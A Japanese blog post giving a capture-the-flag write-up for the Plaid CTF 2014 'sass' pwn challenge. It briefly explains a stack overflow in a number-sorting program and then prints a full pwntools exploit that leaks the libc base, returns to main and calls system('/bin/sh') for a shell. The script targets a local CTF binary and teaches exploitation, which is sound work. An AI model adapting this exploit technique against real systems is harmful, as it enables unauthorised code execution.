---
layout: post
alias: "/blog/2016/09/15/plaidctf-2014-sass/"
date: "2016-09-15T15:43:57+09:00"
tags: [ "competitive", "writeup", "pwn", "plaidctf" ]
"target_url": [ "https://github.com/ctfs/write-ups-2014/tree/master/plaid-ctf-2014/sass" ]
---

# Plaid CTF 2014: sass

手元で解いた。
練習用に鯖を建てていたのだが、こちらに投げたら通らず。
stack上の値を眺めながらいい感じにするだけの問題であるので、実質解き直しかつそこまでするほどの楽しさはなく、鯖は放棄した。

## solution

入力された数値($10$や$16$進の諸々の形式をいい感じに読んでくれる)をstackのbufferに積み(正確には$0$で初期化してあるところに足し引き)、(符号付きで)sortし、出力するプログラム。
bofがあって、入力した数値でreturn addressを触れる。
libcのbase addressを得つつreturn-to-mainしてから再度bofでsystemを呼ぶ。
PIEではあるが、`get_pc_thunk.bx`の跡が残っているのでこれに差分を与えてmainのaddressを作ればよい。

``` c++
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
context.log_level = 'debug'

elf = ELF('./sass')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
p = process('./sass')

p.recvuntil('Enter your numbers:\n')
for i in range(32):
    p.sendline(str(0x80000000))
p.sendline(str(0))
p.sendline(str(- 0x250))
p.sendline(str(- 11)) # main
p.sendline(str(0x7fffffff + 2))
p.sendline(str(0))
p.sendline(str(0))
p.sendline(str(0x7fffffff + 2))
p.sendline(str(0)) # __libc_start_main
p.sendline(str(0x7fffffff + 3)) # argc
p.sendline(str(0)) # argv
p.sendline(str(0)) # envp
p.sendline()
p.recvuntil('OK, here you are:\n')
for i in range(32):
    assert int(p.recvline(), 16) == 0x80000000
libc_base = int(p.recvline(), 16) - (libc.symbols['__libc_start_main'] + 247)
log.info('libc base: %#x', libc_base)
libc_static = int(p.recvline(), 16)
assert int(p.recvline(), 16) == libc_static
assert int(p.recvline(), 16) == libc_static + 0x3dc
log.info('libc static: %#x', libc_static)
argv = int(p.recvline(), 16)
log.info('argv: %#x', argv)
envp = int(p.recvline(), 16)
log.info('envp: %#x', envp)
program_base = int(p.recvline(), 16)
log.info('program base: %#x', program_base)
assert int(p.recvline(), 16) == program_base + elf.symbols['main']
for i in range(3):
    assert int(p.recvline(), 16) == 0x7fffffff

p.recvuntil('Enter your numbers:\n')
for i in range(32):
    p.sendline(str(0x80000000))
p.sendline(str(- 0x80000000 - libc_static - 0x3dc))
p.sendline(str(- 0x80000000 - argv))
p.sendline(str(- 0x80000000 - envp))
p.sendline(str(- 0x80000000 - program_base))
p.sendline(str((0x7fffffff - libc_base - libc.symbols['system']      ) % 0x100000000))
p.sendline(str((0x7fffffff - libc_base - libc.symbols['system'] - 1  ) % 0x100000000))
p.sendline(str((0x7fffffff - libc_base - next(libc.search('/bin/sh'))) % 0x100000000))
p.sendline()
p.recvuntil('OK, here you are:\n')

time.sleep(1)
p.sendline('id')
p.interactive()
```
